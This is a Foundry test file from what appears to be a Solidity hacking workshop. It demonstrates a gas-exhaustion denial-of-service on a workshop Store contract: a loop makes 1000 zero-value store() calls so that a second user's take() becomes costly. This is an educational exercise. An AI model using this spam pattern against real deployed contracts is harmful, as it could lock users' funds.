// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Store} from "../src/SolidityHackingWorkshopV8.sol";

contract Exercise1_Store is Test {
    Store public store;

    function setUp() public {
        store = new Store();
    }

    function test_DOSAttack() public {
        address userA = vm.addr(1);
        address userB = vm.addr(2);

        vm.txGasPrice(1);

        vm.deal(userA, 2 ether);
        vm.deal(userB, 3 ether);
        vm.deal(address(this), 3 ether);

        vm.startPrank(userA);
        store.store{value: 2 ether}();
        vm.stopPrank();

        vm.startPrank(userB);
        store.store{value: 1 ether}();
        vm.stopPrank();

        uint256 gasStart = gasleft();

        console.log("gas used before spaming: ", gasStart);
        vm.startPrank(userA);
        store.take();
        vm.stopPrank();

        for (uint i = 0; i < 1000; i++) {
            store.store();
        }

        uint256 gasEnd = gasleft();

        console.log("gas used after spaming: ", gasEnd);
        vm.startPrank(userB);
        store.take();
    }
}
